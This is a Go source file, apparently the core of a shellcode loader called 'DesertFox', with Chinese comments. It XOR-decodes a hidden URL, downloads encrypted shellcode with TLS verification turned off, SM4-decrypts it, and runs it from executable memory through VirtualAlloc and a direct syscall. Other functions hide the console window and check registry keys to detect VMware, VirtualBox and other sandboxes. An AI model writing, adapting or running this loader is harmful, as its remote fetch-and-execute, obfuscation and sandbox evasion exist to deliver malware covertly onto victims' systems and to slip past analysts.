package function

import (
	"crypto/tls"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/w32"  //将该项目https://github.com/gonutz/ide/tree/master/w32本地导入
	"io/ioutil"
	"log"
	"golang.org/x/gmsm/sm4"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
	"strconv"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	key = []byte("douknowwhoami?dr") // 对应的16位密钥
	XorKey	[]byte = []byte{0x32, 0x34, 0x85, 0x6A, 0xA3, 0xFF, 0xF4, 0x7B}
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
)

//解密URL
func dec(src string) (res string) {
	var s int64
	var result string
	j := 0
	bt := []rune(src)
	for i := 0; i < len(src)/2; i++ {
		s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
		result = result + string(byte(s)^XorKey[j])
		j = (j + 1) % 8
	}
	return result
}


//DesertFox主函数

func Proceed() {
	// Url := "http://192.168.0.100:8080/zha0gongz1"	
	Url := dec("5a40f11a99d0db4a0b06ab5b95c7da4b1c05b55a99c7c443021bff02c2cf93145c53ff5b")	//shellcode远程地址
	var ecbDec []byte
	tr :=&http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
	}
	CL:=&http.Client{Transport:tr}
	resp,err := CL.Get(Url)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		ecbDec = bodyBytes
	}
	charcode, err := sm4.Sm4Ecb(key, ecbDec, false)

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkErr(err)

	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}

	syscall.Syscall(addr, 0, 0, 0, 0)

}

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func HideWindow() {
	console := w32.GetConsoleWindow()

	if console == 0 {
		return // no console attached
	}
	_, consoleProcID := w32.GetWindowThreadProcessId(console)

	if w32.GetCurrentProcessId() == consoleProcID {

		w32.ShowWindowAsync(console, w32.SW_HIDE)

	}
}

func CheckSandbox() []string{
	EvidenceOfSandbox := make([]string, 0)

	sandboxStrings := [...]string{`vmware`, `virtualbox`, `vbox`, `qemu`, `xen`}

	HKLM_Keys_To_Check_Exist := [...]string{
		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier`,
		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier`,
		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 3\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier`,
		`SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_VMware_&Prod_VMware_Virtual_S`,
		`SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase\root#vmwvmcihostdev`,
		`SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers`,
		`SOFTWARE\VMWare, Inc.\VMWare Tools`,
		`SOFTWARE\Oracle\VirtualBox Guest Additions`,
		`SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\DriverDesc`,
		`HARDWARE\ACPI\DSDT\VBOX_`,
	}

	HKLM_Keys_With_Values_To_Parse := [...]string{
		`SYSTEM\ControlSet001\Services\Disk\Enum\0`,
		`HARDWARE\Description\System\SystemBiosInformation`,
		`HARDWARE\Description\System\VideoBiosVersion`,
		`HARDWARE\Description\System\BIOS\SystemManufacturer`,
		`HARDWARE\Description\System\BIOS\SystemProductName`,
		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0`,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\DEBC90B799113AB499842AD87B9C3C69\InstallProperties\DisplayName`,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\DEBC90B799113AB499842AD87B9C3C69\InstallProperties\Publisher`,
		`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Installer\Products\DEBC90B799113AB499842AD87B9C3C69\ProductName`,
	}

	for _, HKLM_Key := range HKLM_Keys_To_Check_Exist {
		Opened_Key, err := registry.OpenKey(registry.LOCAL_MACHINE, HKLM_Key, registry.QUERY_VALUE)
		defer Opened_Key.Close()

		if (err == nil) {
			EvidenceOfSandbox = append(EvidenceOfSandbox, `HKLM:\` + HKLM_Key)
		}
	}

	for _, HKLM_Key := range HKLM_Keys_With_Values_To_Parse {
		Opened_Key, err := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Dir(HKLM_Key), registry.QUERY_VALUE)
		defer Opened_Key.Close()

		if (err == nil) {
			regValue, _, err := Opened_Key.GetStringValue(filepath.Base(HKLM_Key))
			if (err == nil) {
				for _, sandboxString := range sandboxStrings {
					if strings.Contains(strings.ToLower(regValue), strings.ToLower(sandboxString)) {
						EvidenceOfSandbox = append(EvidenceOfSandbox, HKLM_Key + " => " + regValue)
					}
				}
			}
		}
	}

	return EvidenceOfSandbox
}
